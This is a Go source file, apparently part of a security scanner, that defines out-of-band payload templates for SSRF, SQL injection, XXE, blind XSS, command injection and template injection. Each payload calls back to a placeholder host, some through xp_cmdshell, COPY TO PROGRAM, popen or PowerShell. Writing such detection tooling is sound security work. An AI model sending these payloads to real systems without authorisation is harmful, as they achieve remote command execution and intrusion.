package local

import "strings"

// PayloadTemplate represents a payload template with an OAST URL placeholder.
type PayloadTemplate struct {
	Name        string // Template name
	Description string // Human-readable description
	Category    string // Vulnerability category: ssrf, sqli, xss, xxe, cmdi, etc.
	Template    string // Payload with {OAST_URL} placeholder
}

// OASTURLPlaceholder is the placeholder replaced with actual OAST URLs.
const OASTURLPlaceholder = "{OAST_URL}"

// DefaultTemplates contains pre-defined payload templates for common vulnerability types.
var DefaultTemplates = []PayloadTemplate{
	// SSRF Templates
	{
		Name:        "SSRF Basic",
		Description: "Basic SSRF test with HTTP callback",
		Category:    "ssrf",
		Template:    "http://{OAST_URL}",
	},
	{
		Name:        "SSRF HTTPS",
		Description: "SSRF test with HTTPS callback",
		Category:    "ssrf",
		Template:    "https://{OAST_URL}",
	},
	{
		Name:        "SSRF URL Parameter",
		Description: "SSRF test for URL parameters",
		Category:    "ssrf",
		Template:    "http://{OAST_URL}/ssrf?source=param",
	},
	{
		Name:        "SSRF Redirect",
		Description: "SSRF via redirect follow",
		Category:    "ssrf",
		Template:    "http://{OAST_URL}/redirect",
	},

	// SQL Injection Templates
	{
		Name:        "Blind SQLi - DNS (MSSQL)",
		Description: "SQL injection with DNS exfiltration for MSSQL",
		Category:    "sqli",
		Template:    "'; EXEC master..xp_cmdshell 'nslookup {OAST_URL}'--",
	},
	{
		Name:        "Blind SQLi - HTTP (MySQL)",
		Description: "SQL injection with HTTP callback for MySQL",
		Category:    "sqli",
		Template:    "' UNION SELECT LOAD_FILE(CONCAT('http://','{OAST_URL}','/sqli'))--",
	},
	{
		Name:        "Blind SQLi - PostgreSQL",
		Description: "SQL injection with HTTP callback for PostgreSQL",
		Category:    "sqli",
		Template:    "'; COPY (SELECT '') TO PROGRAM 'curl http://{OAST_URL}/sqli'--",
	},
	{
		Name:        "Blind SQLi - Oracle",
		Description: "SQL injection with HTTP callback for Oracle",
		Category:    "sqli",
		Template:    "' UNION SELECT UTL_HTTP.REQUEST('http://{OAST_URL}/sqli') FROM DUAL--",
	},

	// XXE Templates
	{
		Name:        "XXE External Entity",
		Description: "XML external entity with HTTP callback",
		Category:    "xxe",
		Template:    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{OAST_URL}/xxe">]><foo>&xxe;</foo>`,
	},
	{
		Name:        "XXE Parameter Entity",
		Description: "XML parameter entity with callback",
		Category:    "xxe",
		Template:    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{OAST_URL}/xxe"> %xxe;]><foo>test</foo>`,
	},
	{
		Name:        "XXE SVG",
		Description: "XXE via SVG image upload",
		Category:    "xxe",
		Template:    `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://{OAST_URL}/xxe">]><svg>&xxe;</svg>`,
	},

	// XSS Templates
	{
		Name:        "Blind XSS - Image",
		Description: "XSS with image load callback",
		Category:    "xss",
		Template:    `<img src="http://{OAST_URL}/xss">`,
	},
	{
		Name:        "Blind XSS - Script",
		Description: "XSS with script load callback",
		Category:    "xss",
		Template:    `<script src="http://{OAST_URL}/xss"></script>`,
	},
	{
		Name:        "Blind XSS - Iframe",
		Description: "XSS with iframe callback",
		Category:    "xss",
		Template:    `<iframe src="http://{OAST_URL}/xss"></iframe>`,
	},
	{
		Name:        "Blind XSS - CSS Import",
		Description: "XSS with CSS import callback",
		Category:    "xss",
		Template:    `<style>@import url('http://{OAST_URL}/xss');</style>`,
	},

	// Command Injection Templates
	{
		Name:        "Command Injection - cURL",
		Description: "Command injection using cURL",
		Category:    "cmdi",
		Template:    "`curl http://{OAST_URL}/cmdi`",
	},
	{
		Name:        "Command Injection - wget",
		Description: "Command injection using wget",
		Category:    "cmdi",
		Template:    "`wget http://{OAST_URL}/cmdi`",
	},
	{
		Name:        "Command Injection - nslookup",
		Description: "Command injection with DNS callback",
		Category:    "cmdi",
		Template:    "`nslookup {OAST_URL}`",
	},
	{
		Name:        "Command Injection - PowerShell",
		Description: "Command injection for Windows PowerShell",
		Category:    "cmdi",
		Template:    "; powershell -c \"Invoke-WebRequest http://{OAST_URL}/cmdi\"",
	},

	// SSTI Templates
	{
		Name:        "SSTI - Jinja2",
		Description: "Server-side template injection for Jinja2",
		Category:    "ssti",
		Template:    `{{config.__class__.__init__.__globals__['os'].popen('curl http://{OAST_URL}/ssti').read()}}`,
	},
	{
		Name:        "SSTI - Twig",
		Description: "Server-side template injection for Twig",
		Category:    "ssti",
		Template:    `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("curl http://{OAST_URL}/ssti")}}`,
	},

	// Header Injection Templates
	{
		Name:        "Header Injection - Host",
		Description: "Host header injection test",
		Category:    "header",
		Template:    "{OAST_URL}",
	},
}

// Build replaces the OAST URL placeholder with the actual URL.
func (t *PayloadTemplate) Build(oastURL string) string {
	return strings.ReplaceAll(t.Template, OASTURLPlaceholder, oastURL)
}

// BuildWithHost replaces the placeholder with just the host portion.
func (t *PayloadTemplate) BuildWithHost(host string) string {
	return strings.ReplaceAll(t.Template, OASTURLPlaceholder, host)
}

// GetTemplatesByCategory returns all templates for a specific category.
func GetTemplatesByCategory(category string) []PayloadTemplate {
	var results []PayloadTemplate
	for _, t := range DefaultTemplates {
		if t.Category == category {
			results = append(results, t)
		}
	}
	return results
}

// GetAllCategories returns all unique template categories.
func GetAllCategories() []string {
	seen := make(map[string]bool)
	var categories []string

	for _, t := range DefaultTemplates {
		if !seen[t.Category] {
			seen[t.Category] = true
			categories = append(categories, t.Category)
		}
	}

	return categories
}

// GetTemplateByName returns a template by its name.
func GetTemplateByName(name string) *PayloadTemplate {
	for _, t := range DefaultTemplates {
		if t.Name == name {
			return &t
		}
	}
	return nil
}

// TemplateRegistry allows registration of custom templates.
type TemplateRegistry struct {
	templates []PayloadTemplate
}

// NewTemplateRegistry creates a new registry with default templates.
func NewTemplateRegistry() *TemplateRegistry {
	return &TemplateRegistry{
		templates: append([]PayloadTemplate{}, DefaultTemplates...),
	}
}

// Register adds a custom template to the registry.
func (r *TemplateRegistry) Register(t PayloadTemplate) {
	r.templates = append(r.templates, t)
}

// GetByCategory returns all templates for a category from the registry.
func (r *TemplateRegistry) GetByCategory(category string) []PayloadTemplate {
	var results []PayloadTemplate
	for _, t := range r.templates {
		if t.Category == category {
			results = append(results, t)
		}
	}
	return results
}

// GetAll returns all templates from the registry.
func (r *TemplateRegistry) GetAll() []PayloadTemplate {
	return r.templates
}

// GetByName returns a template by name from the registry.
func (r *TemplateRegistry) GetByName(name string) *PayloadTemplate {
	for _, t := range r.templates {
		if t.Name == name {
			return &t
		}
	}
	return nil
}
